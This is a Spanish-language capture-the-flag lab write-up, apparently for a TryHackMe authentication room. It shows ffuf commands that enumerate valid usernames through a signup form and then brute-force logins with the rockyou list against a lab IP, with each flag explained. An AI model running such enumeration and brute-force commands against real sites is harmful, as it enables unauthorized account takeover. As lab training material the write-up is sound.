Task 1  Brief

openvpn

Task 2


![image](https://user-images.githubusercontent.com/92405961/217765551-5cb88aa8-c482-4f61-862f-ac1ea17f3b58.png)

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.244.198/customers/signup -mr "username already exists" -o validusers.txt -t 200

-w wordlist usuarios
-X metodo (GET, POST, ETC)
-d especificamos la data que vamos a enviar (donde se encuentra el FUZZ es donde se introduciran los valores de la lista)
-H agrega headers adicionales
-u especifica la url
-mr es el texto que esperamos la pagina nos devuelta, en este caso es que ese nombre de usuario ya existe
-o para indicar un output al resultado del comando
-t para indicar cuantos threads poner en funcionamiento, a mayor cantidad, mas rapido se hara el trabajo.

![image](https://user-images.githubusercontent.com/92405961/217763558-9a7cbc62-93b5-4b57-91eb-f444ee741b85.png)

![image](https://user-images.githubusercontent.com/92405961/217763861-a1ea0281-ee3a-4cdd-8f2d-88c3ffd5ae68.png)

Una vez ejecutado el comando podemos completar las respuestas

![image](https://user-images.githubusercontent.com/92405961/217765821-4952a138-231d-41c8-8b3c-a1642d20092e.png)

Task 3 Brute Force

Ahora que conocemos los nombres de usuario podemos intentar realizar un ataque de fuerza bruta.

Para ello seguiremos utilizando la herramienta fuff

ffuf -w validusers.txt:W1,/home/kali/Tryhackme/rockyou.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.244.198/customers/login -fc 200 -t 200

En este caso -w esta compuesto de dos listas, la primera aclarada con W1 y la segunda con W2
En -d especificamos que la W1 sera utilizada en el nombre de usuario y W2 en contraseña (recordar que poseemos los nombres de usuario de la tarea anterior y las contraseñas de alguna lista disponible)
Con el -fc logramos que nos devuelta un codigo en particular (en este caso, el 200 que es OK para HTTP/HTTPS)

Una vez ejecutado el comando, conseguimos nuestras primeras credenciales de acceso

![image](https://user-images.githubusercontent.com/92405961/217768638-86bb6828-bf65-4e80-8fa1-fec17390b80e.png)

Comprobamos que podemos acceder con las credenciales
![image](https://user-images.githubusercontent.com/92405961/217768950-9e8e701b-59c3-4bf6-9230-9d0d3ce2b2d9.png)




